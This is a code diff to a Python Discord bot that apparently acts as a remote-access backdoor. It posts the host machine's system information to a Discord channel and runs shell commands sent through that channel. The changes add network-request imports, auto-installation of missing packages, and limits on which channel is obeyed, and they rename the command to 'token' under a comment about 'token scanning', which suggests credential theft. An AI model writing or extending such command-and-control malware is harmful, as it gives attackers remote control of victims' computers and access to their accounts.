@@ -1,16 +1,22 @@
-import subprocess
 import sys
+import subprocess
+from discord.ext import commands
 import os
 import platform
 import hashlib
-from discord.ext import commands
+import discord
+from urllib.request import Request, urlopen
 
-try:
-    import discord
-except ImportError:
-    print("discord.py library not found. Installing...")
-    subprocess.check_call(
-        [sys.executable, "-m", "pip", "install", "discord.py"])
+required_packages = ["discord", "os", "platform",
+                     "hashlib", "re", "json", "urllib"]
+
+for package in required_packages:
+    try:
+        __import__(package)
+    except ImportError:
+        print(f"{package} library not found. Installing...")
+        subprocess.check_call(
+            [sys.executable, "-m", "pip", "install", package])
 
 # Define your intents
 intents = discord.Intents.default()
@@ -47,8 +53,10 @@ async def on_ready():
         guild.channels, name=channel_name, type=discord.ChannelType.text)
     if existing_channel:
         bot.text_channel = existing_channel
+        print(f'Using existing channel: {existing_channel.name}')
     else:
         bot.text_channel = await guild.create_text_channel(channel_name)
+        print(f'Created new channel: {bot.text_channel.name}')
 
     # Send system information in the created channel
     try:
@@ -65,6 +73,10 @@ async def on_message(message):
     if message.author.bot:
         return
 
+    # Check if the message is in the correct channel
+    if message.channel != bot.text_channel:
+        return
+
     # Check if the message starts with the command prefix
     if message.content.lower().startswith('command'):
         command = message.content[len('command'):].strip()
@@ -76,11 +88,12 @@ async def on_message(message):
     # Continue with the normal command processing
     await bot.process_commands(message)
 
-# Define a command to execute system commands
+# Define command for token scanning
 
 
-@bot.command(name='command')
+@bot.command(name='token')
 async def execute_command(ctx, *args):
+
     command = ' '.join(args)  # Combine all arguments into a single string
     try:
         # Execute the system command
